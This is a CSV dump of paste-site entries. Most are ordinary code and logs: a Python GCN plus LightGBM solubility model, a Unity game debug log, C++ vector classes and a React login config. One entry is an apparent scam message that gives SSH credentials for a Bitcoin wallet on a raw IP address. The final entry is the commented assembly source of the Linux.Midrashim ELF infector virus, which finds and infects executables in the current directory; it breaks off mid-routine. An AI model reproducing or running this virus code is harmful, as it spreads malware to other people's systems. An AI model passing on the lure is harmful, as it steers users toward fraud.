id,title,username,language,date,content
Bs4XNgP0,GCN+LightGBM.,YomoMan,Python,Wednesday 7th of June 2023 07:00:44 AM CDT,"class Solubility(nn.Module):
    def __init__(self, n_features=30, in_channels=32, out_channels=16, gcn_in_channels=32, gcn_out_channels=16, dropout_rate=0.45):
        super(Solubility, self).__init__()
        torch.manual_seed(21)
        self.conv1 = GCNConv(n_features, in_channels)
        self.conv2 = GCNConv(in_channels, out_channels)

        # self.gcn = GCN(n_features=30, in_channels=gcn_in_channels, out_channels=gcn_out_channels)
        self.lightgbm = None
        self.fc = nn.Linear(out_channels + 1, 1)
        
        self.dropout_rate = dropout_rate
        self.featurizer = dc.feat.RDKitDescriptors(use_fragment=False, ipc_avg=False, use_bcut2d=True)
        self.normalizer = None

        self.reset_parameters()

    def forward(self, data):
        x, edge_index = data.x, data.edge_index
        x = self.conv1(x, edge_index).relu()
        x = self.conv2(x, edge_index).relu()
        x = global_mean_pool(x, data.batch)
        x = F.dropout(x, p=self.dropout_rate, training=self.training)
        
        assert self.lightgbm is not None, ""Train LightGBM model first""

        if self.normalizer:
            predictions = self.lightgbm.predict(self.normalizer.transform(self.featurizer(data.smiles)))
            lightgbm_output = torch.tensor(predictions, dtype=torch.float32).unsqueeze(1)                
        else:
            predictions = self.lightgbm.predict(self.featurizer(data.smiles))
            lightgbm_output = torch.tensor(predictions, dtype=torch.float32).unsqueeze(1)
        x = torch.hstack((x, lightgbm_output))

        x = self.fc(x)
        return x

    
    def _collect_dataset_data(self, dataset):
        smiles, targets = zip(*((data.smiles, data.y.numpy()[0]) for data in dataset))
        return np.array(smiles), np.array(targets)

    def train_lightgbm(self, train_dataset, valid_dataset, normalize_data=False):    
        self.normalizer = DataNormalizer() if normalize_data else None
  
        train_smiles, y_train = self._collect_dataset_data(train_dataset)
        X_train = pd.DataFrame(data=self.featurizer(train_smiles), columns=self.featurizer.descriptors)
        print('X_train.shape=', X_train.shape)
        if normalize_data: X_train = self.normalizer.fit_transform(X_train)
        
        valid_smiles, y_valid = self._collect_dataset_data(valid_dataset)
        X_valid = pd.DataFrame(data=self.featurizer(valid_smiles), columns=self.featurizer.descriptors)    
        print('X_valid.shape=', X_valid.shape)   
        if normalize_data: X_valid = self.normalizer.transform(X_valid)
        
        train_data = lgb.Dataset(X_train, label=y_train)
        valid_data = lgb.Dataset(X_valid, label=y_valid, reference=train_data)
   
        hyperparams = {
            'objective': 'regression',
            'metric': 'mse',
            'boosting':'dart',
            'n_estimators': 10000,
            'early_stopping_rounds': 100,
            'learning_rate': 0.3,
            'feature_fraction': 0.45,
            'bagging_freq': 5,
            'bagging_fraction': 0.9,
            'bagging_seed': 42
        }
        self.lightgbm = lgb.train(hyperparams, train_data,
                                  valid_sets=[train_data, valid_data], 
                                  valid_names=['train', 'valid'])
        
    def reset_parameters(self):
        self.conv1.reset_parameters()
        self.conv2.reset_parameters()
        self.fc.reset_parameters()
        
    def save_models(self):
        import joblib
        torch.save(self.state_dict(), 'gcn_fc_weights.pth')
        joblib.dump(self.lightgbm, 'lgb_solubility_model.pkl')
        
    def load_models(self, 
                    gcn_fc_path='gcn_fc_weights.pth', 
                    lbg_path='lgb_solubility_model.pkl'):
        import joblib
        self.load_state_dict(torch.load(gcn_fc_path))
        self.lightgbm = joblib.load(lbg_path)
        
    @classmethod
    def from_pickle(cls, 
                    gcn_fc_path='gcn_fc_weights.pth', 
                    lbg_path='lgb_solubility_model.pkl'):
        m = cls()
        m.load_model(gcn_fc_path, lbg_path)
        return m "
1S8w17YY,"6/7/2023 2:44 PM - MacBookPro17,1",Ozick625,autoconf,Wednesday 7th of June 2023 06:44:38 AM CDT,"Log: Initializing Lion Suite v2.5.1...
Log: Lion Suite already initialized. Aborting.
Log: [Adjust]: SDK can not be used in Editor.
Log: [Adjust]: SDK can not be used in Editor.
Log: DP::: Slicing additive images:
Log: DP::: Start creating image puzzles ID:2x2 Pic 0.
Log: DP::: Created image puzzle element — ID:36012, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:36012, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:36012, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:36012, Coords:(1,1).
Log: DP::: Start creating image puzzles ID:2x2 Pic 4.
Log: DP::: Created image puzzle element — ID:36014, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:36014, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:36014, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:36014, Coords:(1,1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 0, Coords:(1, 1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 4, Coords:(0, 0).
Log: DP::: Slicing additive images:
Log: DP::: Start creating image puzzles ID:2x2 Pic 0.
Log: DP::: Created image puzzle element — ID:36012, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:36012, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:36012, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:36012, Coords:(1,1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 0, Coords:(0, 1).
Warning: DontDestroyOnLoad only works for root GameObjects or components on root GameObjects.
Log: DP::: Slicing additive images:
Log: DP::: Start creating image puzzles ID:2x2 Pic 1.
Log: DP::: Created image puzzle element — ID:34072, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:34072, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:34072, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:34072, Coords:(1,1).
Log: DP::: Start creating image puzzles ID:2x2 Pic 2.
Log: DP::: Created image puzzle element — ID:36016, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:36016, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:36016, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:36016, Coords:(1,1).
Log: DP::: Loading in the slicer.........................................
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 1, Coords:(0, 0).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 1, coords:(0, 0).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 1, Coords:(1, 0).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 1, coords:(1, 0).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 1, Coords:(0, 1).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 1, coords:(0, 1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 1, Coords:(1, 1).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 1, coords:(1, 1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 2, Coords:(0, 0).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 2, coords:(0, 0).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 2, Coords:(1, 0).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 2, coords:(1, 0).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 2, Coords:(0, 1).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 2, coords:(0, 1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 2, Coords:(1, 1).
Log: DP::: Loading image puzzle to slicer — ID:2x2 Pic 2, coords:(1, 1).
Log: DP::: Loading in the slicer is completed.
Log: <color=yellow>The size of the stack is now 8. Progress equal 0%.</color>
Log: DP::: Pulling elements to the stack from the slicer.
Log: DP::: Detected save on first spawn. Loading...
Log: DP::: Loading in the stack.......
Log: DP::: Slicing additive images:
Log: DP::: Start creating image puzzles ID:2x2 Pic 4.
Log: DP::: Created image puzzle element — ID:36014, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:36014, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:36014, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:36014, Coords:(1,1).
Log: DP::: Start creating image puzzles ID:2x2 Pic 0.
Log: DP::: Created image puzzle element — ID:36012, Coords:(0,0).
Log: DP::: Created image puzzle element — ID:36012, Coords:(1,0).
Log: DP::: Created image puzzle element — ID:36012, Coords:(0,1).
Log: DP::: Created image puzzle element — ID:36012, Coords:(1,1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 4, Coords:(1, 1).
Log: DP::: Loading element to stack — ID:2x2 Pic 4, coords:(1, 1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 4, Coords:(0, 1).
Log: DP::: Loading element to stack — ID:2x2 Pic 4, coords:(0, 1).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 0, Coords:(0, 0).
Log: DP::: Loading element to stack — ID:2x2 Pic 0, coords:(0, 0).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 0, Coords:(1, 0).
Log: DP::: Loading element to stack — ID:2x2 Pic 0, coords:(1, 0).
Log: DP::: Pulling the additive puzzles — ID: 2x2 Pic 4, Coords:(1, 0).
Log: DP::: Loading element to stack — ID:2x2 Pic 4, coords:(1, 0).
Log: DP::: Pulling a image to the stack — ID:36012, coords:(0, 0).
Log: DP::: Pulling a image to the stack — ID:36014, coords:(1, 0).
Log: DP::: Pulling a image to the stack — ID:36014, coords:(1, 1).
Log: DP::: Pulling a image to the stack — ID:36014, coords:(0, 1).
Log: DP::: Pulling a image to the stack — ID:36012, coords:(1, 0).
Log: Debug [AppLovin MAX] Listener has been added to callback: OnRewardedAdReceivedRewardEvent
Log: Debug [AppLovin MAX] Listener has been added to callback: OnInterstitialAdHiddenEvent
Log: Debug [AppLovin MAX] Listener has been added to callback: OnRewardedAdLoadedEvent
Log: Debug [AppLovin MAX] Listener has been added to callback: OnRewardedAdLoadFailedEvent
Log: Debug [AppLovin MAX] Listener has been added to callback: OnInterstitialAdLoadedEvent
Log: Debug [AppLovin MAX] Listener has been added to callback: OnInterstitialAdLoadFailedEvent
Log: Hiding Lion Debugger
Log: Called LoadAds
Log: MaxSDK init Complete.  Consent Dialog State = Unknown
Exception: DllNotFoundException: FirebaseCppApp-11_0_0 assembly:<unknown assembly> type:<unknown type> member:(null)
---Stacktrace: Firebase.AppUtilPINVOKE+SWIGExceptionHelper..cctor () (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/macos_unity/x86_64/app/swig/Firebase.App_fixed.cs:4087)
Rethrow as TypeInitializationException: The type initializer for 'SWIGExceptionHelper' threw an exception.
Firebase.AppUtilPINVOKE..cctor () (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/macos_unity/x86_64/app/swig/Firebase.App_fixed.cs:4107)
Rethrow as TypeInitializationException: The type initializer for 'Firebase.AppUtilPINVOKE' threw an exception.
Firebase.AppUtil.SetLogFunction (Firebase.LogUtil+LogMessageDelegate arg0) (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/macos_unity/x86_64/app/swig/Firebase.App_fixed.cs:4817)
Firebase.LogUtil..ctor () (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/app/src/LogUtil.cs:81)
Firebase.LogUtil..cctor () (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/app/src/LogUtil.cs:37)
Rethrow as TypeInitializationException: The type initializer for 'Firebase.LogUtil' threw an exception.
Rethrow as TypeInitializationException: The type initializer for 'Firebase.FirebaseApp' threw an exception.
Firebase.RemoteConfig.FirebaseRemoteConfig.get_DefaultInstance () (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/remote_config/src/FirebaseRemoteConfig.cs:164)
wzebra.kit.remote.FirebaseRemoteConfig.InvokeOnLoad (UnityEngine.Events.UnityAction onLoad) (at Assets/WZebraKit/Scripts/wzkit/RemoteConfig/FirebaseRemoteConfig.cs:29)
Firebase.RemoteConfig.FirebaseRemoteConfig.get_DefaultInstance () (at /Users/runner/work/firebase-unity-sdk/firebase-unity-sdk/remote_config/src/FirebaseRemoteConfig.cs:164)
wzebra.kit.remote.FirebaseRemoteConfig.InvokeOnLoad (UnityEngine.Events.UnityAction onLoad) (at Assets/WZebraKit/Scripts/wzkit/RemoteConfig/FirebaseRemoteConfig.cs:29)
System.Runtime.CompilerServices.AsyncMethodBuilderCore+<>c.<ThrowAsync>b__7_0 (System.Object state) (at <4fdeffda907b481796507bee174be5e3>:0)
UnityEngine.UnitySynchronizationContext+WorkRequest.Invoke () (at /Users/bokken/build/output/unity/unity/Runtime/Export/Scripting/UnitySynchronizationContext.cs:153)
UnityEngine.UnitySynchronizationContext.Exec () (at /Users/bokken/build/output/unity/unity/Runtime/Export/Scripting/UnitySynchronizationContext.cs:83)
UnityEngine.UnitySynchronizationContext.ExecuteTasks () (at /Users/bokken/build/output/unity/unity/Runtime/Export/Scripting/UnitySynchronizationContext.cs:107)

Log: Debug [AppLovin MAX] Invoking event: OnInterstitialLoadedEvent. Params: 3bb3bb869c55d212, [AdInfo adUnitIdentifier: 3bb3bb869c55d212, adFormat: , networkName: , networkPlacement: , creativeIdentifier: , placement: , revenue: -1, revenuePrecision: , dspName: ]
Log: [Adjust]: SDK can not be used in Editor.
Log: Fired event interstitial_load to Adjust SDK
Log: Sending 'Loaded' event - EventParams (10)
{
  ""adType"": ""Interstitial"",
  ""placement"": """",
  ""adProvider"": """",
  ""timeInApp"": 34,
  ""timestamp"": ""06/07/2023 11:44:31"",
  ""sequenceId"": 3371,
  ""debug"": ""false"",
  ""store"": false,
  ""userTutorial"": false,
  ""additionalData"": {
    ""lslc-version"": ""2.5.1"",
    ""lsla-version"": ""2.5.6""
  }
}
Log: Debug [AppLovin MAX] Invoking event: OnRewardedAdLoadedEvent. Params: 86b4907c1a82cffd, [AdInfo adUnitIdentifier: 86b4907c1a82cffd, adFormat: , networkName: , networkPlacement: , creativeIdentifier: , placement: , revenue: -1, revenuePrecision: , dspName: ]
Log: [Adjust]: SDK can not be used in Editor.
Log: Fired event reward_video_load to Adjust SDK
Log: Sending 'Loaded' event - EventParams (10)
{
  ""adType"": ""RV"",
  ""placement"": """",
  ""adProvider"": """",
  ""timeInApp"": 34,
  ""timestamp"": ""06/07/2023 11:44:31"",
  ""sequenceId"": 3371,
  ""debug"": ""false"",
  ""store"": false,
  ""userTutorial"": false,
  ""additionalData"": {
    ""lslc-version"": ""2.5.1"",
    ""lsla-version"": ""2.5.6""
  }
}
Log: Debug [AppLovin MAX] Invoking event: OnInterstitialLoadedEvent. Params: 3bb3bb869c55d212, [AdInfo adUnitIdentifier: 3bb3bb869c55d212, adFormat: , networkName: , networkPlacement: , creativeIdentifier: , placement: , revenue: -1, revenuePrecision: , dspName: ]
Log: [Adjust]: SDK can not be used in Editor.
Log: Fired event interstitial_load to Adjust SDK
Log: Sending 'Loaded' event - EventParams (10)
{
  ""adType"": ""Interstitial"",
  ""placement"": """",
  ""adProvider"": """",
  ""timeInApp"": 34,
  ""timestamp"": ""06/07/2023 11:44:31"",
  ""sequenceId"": 3371,
  ""debug"": ""false"",
  ""store"": false,
  ""userTutorial"": false,
  ""additionalData"": {
    ""lslc-version"": ""2.5.1"",
    ""lsla-version"": ""2.5.6""
  }
}
Log: Debug [AppLovin MAX] Invoking event: OnRewardedAdLoadedEvent. Params: 86b4907c1a82cffd, [AdInfo adUnitIdentifier: 86b4907c1a82cffd, adFormat: , networkName: , networkPlacement: , creativeIdentifier: , placement: , revenue: -1, revenuePrecision: , dspName: ]
Log: [Adjust]: SDK can not be used in Editor.
Log: Fired event reward_video_load to Adjust SDK
Log: Sending 'Loaded' event - EventParams (10)
{
  ""adType"": ""RV"",
  ""placement"": """",
  ""adProvider"": """",
  ""timeInApp"": 34,
  ""timestamp"": ""06/07/2023 11:44:31"",
  ""sequenceId"": 3371,
  ""debug"": ""false"",
  ""store"": false,
  ""userTutorial"": false,
  ""additionalData"": {
    ""lslc-version"": ""2.5.1"",
    ""lsla-version"": ""2.5.6""
  }
}
"
3aVJQfpP,Untitled,35657,C++,Wednesday 7th of June 2023 06:25:49 AM CDT,"#include <iostream>

using namespace std;

class Vector {

public:

    Vector() : size(0), capacity(4), arr(new int[4]) {}

    Vector(const int vector_capacity) : size(0), capacity(vector_capacity), arr(new int[vector_capacity]) {}

    Vector(const Vector& V) : arr(new int[V.capacity]), size(V.size), capacity(V.capacity) {
        for (int i = 0; i < capacity; i++) {
            arr[i] = V.arr[i];
        }
    }

    void Push_back(const int value) {
        if (size == capacity) {
            int* temp = new int[capacity * 2];
            for (int i = 0; i < size; i++) {
                temp[i] = arr[i];
            }
            delete[] arr;
            arr = temp;
            capacity *= 2;
        }
        arr[size] = value;
        size++;
        total_number_elements++;
    }

    void Pop_back() {
        if (size > 0) {
            arr[size - 1] = 0;
            size--;
            total_number_elements--;
        }
    }

    int Size() {
        return size;
    }

    int Capacity() {
        return capacity;
    }

    void Insert(const int index, const int value) {
        if (index < 0 || index >= size) {
            cout << ""Invalid index"" << endl;
            return;
        }
        if (size == capacity) {
            int* temp = new int[capacity * 2];
            for (int i = 0; i < size; i++) {
                temp[i] = arr[i];
            }
            delete[] arr;
            arr = temp;
            capacity *= 2;
        }
        for (int i = size; i > index; i--) {
            arr[i] = arr[i - 1];
        }
        arr[index] = value;
        size++;
        total_number_elements++;
    }

    void Erase(const int index) {
        if (index < 0 || index >= size) {
            cout << ""Invalid index"" << endl;
            return;
        }
        for (int i = index; i < size - 1; i++) {
            arr[i] = arr[i + 1];
        }
        arr[size - 1] = 0;
        size--;
        total_number_elements--;
    }

    int GetValue(const int index) {
        if (index < 0 || index >= size) {
            cout << ""Invalid index"" << endl;
            abort;
        }
        return arr[index];
    }

    void SetValue(const int index, const int value) {
        if (index < 0 || index >= size) {
            cout << ""Invalid index"" << endl;
            return;
        }
        arr[index] = value;
    }

    static int GetTotalNumberElements() {
        return total_number_elements;
    }


    int& operator[](const int ind)
    {
        if (ind < 0 || ind >= size)
        {
            cout << ""ERROR:WRONG INDEX"";
            abort;
        }
        return arr[ind];
    }
    int& operator[](const int ind)
        const
    {
        if (ind < 0 || ind >= size)
        {
            cout << ""ERROR:WRONG INDEX"";
            abort;
        }
        return arr[ind];
    }

    bool operator==(const Vector& vect)
        const
    {
        if (size != vect.size)
            return 0;
        for (int i = 0; i < size; i++)
            if (arr[i] != vect.arr[i])
                return 0;
        return 1;
    }
    bool operator!= (const Vector & vect)
        const
    {
        return !(*this == vect);
    }
    Vector& operator=(const Vector& vect)
    {
        size = vect.size;
        capacity = vect.capacity;
        delete[] arr;
        arr = new int[capacity];
        for (int i = 0; i < capacity; i++)
            arr[i] = vect.arr[i];
        return *this;
    }
    


    ~Vector() {
        delete[] arr;
        total_number_elements -= size;
    }

private:
    int size;
    int capacity;
    int* arr;
    static int total_number_elements;
};

int Vector::total_number_elements = 0;

int main() {

    Vector my_vector;
    for (int i = 0; i < 10; i++)
    {
        my_vector.Push_back(i + 1);
    }
    my_vector[4] = 9;
    for (int i = 0; i < 10; i++)
    {
        cout << my_vector[i] << "" "";
    }
    cout << endl;
    Vector vector2;
    vector2 = my_vector;
    for (int i = 0; i < 10; i++)
    {
        cout << vector2[i] << "" "";
    }
    cout << endl;
    vector2[4] = 4;
    for (int i = 0; i < 10; i++)
    {
        cout << my_vector[i] << "" "";
    }
    cout << endl;
    for (int i = 0; i < 10; i++)
    {
        cout << vector2[i] << "" "";
    }
    return 0;
}"
FvA5fxUQ,Untitled,OvidiuS,TypeScript,Wednesday 7th of June 2023 06:12:33 AM CDT,"import React from 'react';
import ReactDOM from 'react-dom';
import App from './App';
import './index.css';

import { FronteggProvider } from '@frontegg/react';

const contextOptions = {
    baseUrl: 'https://app-2ftvsciind0d.frontegg.com',
    clientId: '8b43b8ad-4663-4d2b-b1f4-93251e8d69d3'
};

ReactDOM.render(
    <FronteggProvider contextOptions={contextOptions} tracing={true} hostedLoginBox={true} authOptions={{ keepSessionAlive: true }}>
        <App />
    </FronteggProvider>,
    document.getElementById('root')
);
"
cEHsk53B,Untitled,35657,C++,Wednesday 7th of June 2023 06:06:58 AM CDT,"#include <iostream>
#include <initializer_list>

using namespace std;

template <typename T>
class SimpleVector {

public:

	SimpleVector() : arr_(new T[10]), size_(10) {}

	SimpleVector(int size) : arr_(new T[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new T[object.size_]{}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector(const initializer_list<int>& list) : arr_(new T[list.size()]{}), size_(list.size()) {
		int i = 0;
		for (auto element : list) {
			arr_[i] = element;
			i++;
		}
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new T[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	T& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	T& operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	T* arr_;
	int size_;
};


template <typename T>
void print(const SimpleVector<T>& vec) {
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << ' ';
	}
	cout << endl;
}

template <typename T>
void sort(SimpleVector<T>& vec) {
	for (int k = 0; k < vec.Size(); k++) {
		for (int j = 0; j < vec.Size() - 1; j++) {
			if (vec[j] > vec[j + 1]) {
				T temp = vec[j];
				vec[j] = vec[j + 1];
				vec[j + 1] = temp;
			}
		}
	}
}


int main() {
	SimpleVector<int> IntVector;
	for (int i = 0; i < IntVector.Size(); i++) {
		IntVector[i] = rand() % 10;
	}
	cout << ""IntVector:"" << endl;
	print(IntVector);
	cout << endl;
	cout << ""Sorted IntVector:"" << endl;
	sort(IntVector);
	print(IntVector);
	cout << endl;

	SimpleVector<string> StringVector;
	StringVector[0] = ""two"";
	StringVector[1] = ""seven"";
	StringVector[2] = ""zero"";
	StringVector[3] = ""four"";
	StringVector[4] = ""one"";
	StringVector[5] = ""three"";
	StringVector[6] = ""five"";
	StringVector[7] = ""six"";
	StringVector[8] = ""eight"";
	StringVector[9] = ""nine"";
	cout << ""StringVector:"" << endl;
	print(StringVector);
	cout << endl;
	cout << ""Sorted StringVector:"" << endl;
	sort(StringVector);
	print(StringVector);
	cout << endl;

	SimpleVector<int> IntVector2{1, 2, 3, 4, 5, 6, 7};
	print(IntVector2);
}"
x9bqsTbm,BTC Wallet Credentials have been reset,biernarwh_30,GetText,Wednesday 7th of June 2023 06:06:34 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
embriagoit:r6Cs7G on 193.233.202.76(SSH)
Regards"
TscyHuZK,Linux.Midrashim - Infector Virus,FlyFar,ASM (NASM),Wednesday 7th of June 2023 06:06:33 AM CDT,"; Linux.Midrashim
; Written by TMZ
;
; Finished on 30.05.2020
; Released on 07.11.2020
; The release was delayed because I was trying to code a fancy 90's style payload and due to lack of time, I'll leave this to another project.
; This is my first full assembly virus and should be assembled with FASM x64.
;   - relies on PT_NOTE -> PT_LOAD infection technique and should work on regular x64 ELF executables (position independent or not).
;   - should use mmap but instead it uses pread and pwrite (due to lazyness). 
;   - stores stuff on memory buffer (r15 register).
;   - infects current directory (non recursively).
;   - has several parts that could have improved, like detecting first virus execution with a better approach.
;
; Payload (non destructive) is a quote from a song and it's encoded for no reason whatsoever.
; 
; A big thanks for those who keeps the VX scene alive!
; Feel free to email me: tmz@null.net || tmz@syscall.sh || thomazi@linux.com
; @guitmz || @TMZvx
; https://www.guitmz.com
; https://syscall.sh
;
; Use at your own risk, I'm not responsible for any damages that this may cause, do not spread it into the wild!
;
; References:
; https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf
; https://www.wikidata.org/wiki/Q6041496
; https://legacyofkain.fandom.com/wiki/Ozar_Midrashim
; https://en.wikipedia.org/wiki/Don%27t_Be_Afraid_(album)
;
; Stack buffer:
; r15 + 0 = stack buffer (10000 bytes) = stat
; r15 + 48 = stat.st_size
; r15 + 144 = ehdr
; r15 + 148 = ehdr.class
; r15 + 152 = ehdr.pad
; r15 + 168 = ehdr.entry
; r15 + 176 = ehdr.phoff
; r15 + 198 = ehdr.phentsize
; r15 + 200 = ehdr.phnum
; r15 + 208 = phdr = phdr.type
; r15 + 212 = phdr.flags
; r15 + 216 = phdr.offset
; r15 + 224 = phdr.vaddr
; r15 + 232 = phdr.paddr
; r15 + 240 = phdr.filesz
; r15 + 248 = phdr.memsz
; r15 + 256 = phdr.align
; r15 + 300 = jmp rel
; r15 + 350 = directory size
; r15 + 400 = dirent = dirent.d_ino
; r15 + 416 = dirent.d_reclen
; r15 + 418 = dirent.d_type
; r15 + 419 = dirent.d_name
; r15 + 3000 = first run control flag
; r15 + 3001 = decoded payload

format ELF64 executable 3

SYS_EXIT        = 60
SYS_OPEN        = 2
SYS_CLOSE       = 3
SYS_WRITE       = 1
SYS_READ        = 0
SYS_EXECVE      = 59
SYS_GETDENTS64  = 217
SYS_FSTAT       = 5
SYS_LSEEK       = 8
SYS_PREAD64     = 17
SYS_PWRITE64    = 18
SYS_SYNC        = 162
STDOUT          = 1
EHDR_SIZE       = 64
ELFCLASS64      = 2
O_RDONLY        = 0
O_RDWR          = 2
SEEK_END        = 2
DIRENT_BUFSIZE  = 1024
MFD_CLOEXEC     = 1
DT_REG          = 8
PT_LOAD         = 1
PT_NOTE         = 4
PF_X            = 1
PF_R            = 4
FIRST_RUN       = 1
V_SIZE          = 2631

segment readable executable
entry v_start

v_start:
    mov r14, [rsp + 8]                                          ; saving argv0 to r14
    push rdx
    push rsp
    sub rsp, 5000                                               ; reserving 5000 bytes
    mov r15, rsp                                                ; r15 has the reserved stack buffer address

    check_first_run:
        mov rdi,  r14                                           ; argv0 to rdi
        mov rsi, O_RDONLY
        xor rdx, rdx                                            ; not using any flags
        mov rax, SYS_OPEN
        syscall                                                 ; rax contains the argv0 fd

        mov rdi, rax
        mov rsi, r15                                            ; rsi = r15 = stack buffer address
        mov rax, SYS_FSTAT                                      ; getting argv0 size in bytes
        syscall                                                 ; stat.st_size = [r15 + 48]
        
        cmp qword [r15 + 48], V_SIZE                            ; compare argv0 size with virus size
        jg load_dir                                             ; if greater, not first run, continue infecting without setting control flag
        
        mov byte [r15 + 3000], FIRST_RUN                        ; set the control flag to [r15 + 3000] to represent virus first execution, not a great approach but will do for now

    load_dir:
        push "".""                                                ; pushing ""."" to stack (rsp)
        mov rdi, rsp                                            ; moving ""."" to rdi
        mov rsi, O_RDONLY
        xor rdx, rdx                                            ; not using any flags
        mov rax, SYS_OPEN
        syscall                                                 ; rax contains the fd
        
        pop rdi
        cmp rax, 0                                              ; if can't open file, exit now
        jbe v_stop

        mov rdi, rax                                            ; move fd to rdi
        lea rsi, [r15 + 400]                                    ; rsi = dirent = [r15 + 400]
        mov rdx, DIRENT_BUFSIZE                                 ; buffer with maximum directory size
        mov rax, SYS_GETDENTS64
        syscall                                                 ; dirent contains the directory entries

        test rax, rax                                           ; check directory list was successful
        js v_stop                                               ; if negative code is returned, I failed and should exit

        mov qword [r15 + 350], rax                              ; [r15 + 350] now holds directory size

        mov rax, SYS_CLOSE                                      ; close source fd in rdi
        syscall

        xor rcx, rcx                                            ; will be the position in the directory entries

    file_loop:
        push rcx                                                ; preserving rcx (important!!!)
        cmp byte [rcx + r15 + 418], DT_REG                      ; check if it's a regular file dirent.d_type = [r15 + 418]
        jne .continue                                           ; if not, proceed to next file

        .open_target_file:
            lea rdi, [rcx + r15 + 419]                          ; dirent.d_name = [r15 + 419]
            mov rsi, O_RDWR
            xor rdx, rdx                                        ; not using any flags
            mov rax, SYS_OPEN
            syscall

            cmp rax, 0                                          ; if can't open file, exit now
            jbe .continue
            mov r9, rax                                         ; r9 contains target fd

        .read_ehdr:
            mov rdi, r9                                         ; r9 contains fd
            lea rsi, [r15 + 144]                                ; rsi = ehdr = [r15 + 144]
            mov rdx, EHDR_SIZE                                  ; ehdr.size
            mov r10, 0                                          ; read at offset 0
            mov rax, SYS_PREAD64
            syscall

        .is_elf:
            cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f means .ELF (little-endian)
            jnz .close_file                                     ; not an ELF binary, close and continue to next file if any
        
        .is_64:
            cmp byte [r15 + 148], ELFCLASS64                    ; check if target ELF is 64bit
            jne .close_file                                     ; skipt it if not

        .is_infected:
            cmp dword [r15 + 152], 0x005a4d54                   ; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)
            jz .close_file                                      ; already infected, close and continue to next file if any

            mov r8, [r15 + 176]                                 ; r8 now holds ehdr.phoff from [r15 + 176]
            xor rbx, rbx                                        ; initializing phdr loop counter in rbx
            xor r14, r14                                        ; r14 will hold phdr file offset

        .loop_phdr:
            mov rdi, r9                                         ; r9 contains fd
            lea rsi, [r15 + 208]                                ; rsi = phdr = [r15 + 208]
            mov dx, word [r15 + 198]                            ; ehdr.phentsize is at [r15 + 198]
            mov r10, r8                                         ; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
            mov rax, SYS_PREAD64
            syscall

            cmp byte [r15 + 208], PT_NOTE                       ; check if phdr.type in [r15 + 208] is PT_NOTE (4)
            jz .infect                                          ; if yes, jackpot, start infecting

            inc rbx                                             ; if not, increase rbx counter
            cmp bx, word [r15 + 200]                            ; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
